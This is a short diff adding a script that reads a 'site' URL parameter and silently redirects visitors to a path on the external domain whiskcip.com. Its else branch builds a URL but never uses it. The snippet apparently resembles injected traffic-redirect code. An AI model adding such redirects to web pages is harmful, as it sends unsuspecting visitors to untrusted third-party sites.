@@ -1,0 +1,21 @@
+<script>
+
+const urlParams = new URLSearchParams(window.location.search);
+
+
+const siteParam = urlParams.get('site');
+
+
+if (siteParam) {
+
+  
+        const redirectURL = `https://whiskcip.com/0/0/0/16bc6f9af7817fe7cce2e706a574863e/1/${siteParam}`;
+        
+        
+        window.location.href = redirectURL;
+  
+} else {
+
+    const redirectURL = `https://whiskcip.com/0/0/0/16bc6f9af7817fe7cce2e706a574863e/1/random`;
+}
+</script>
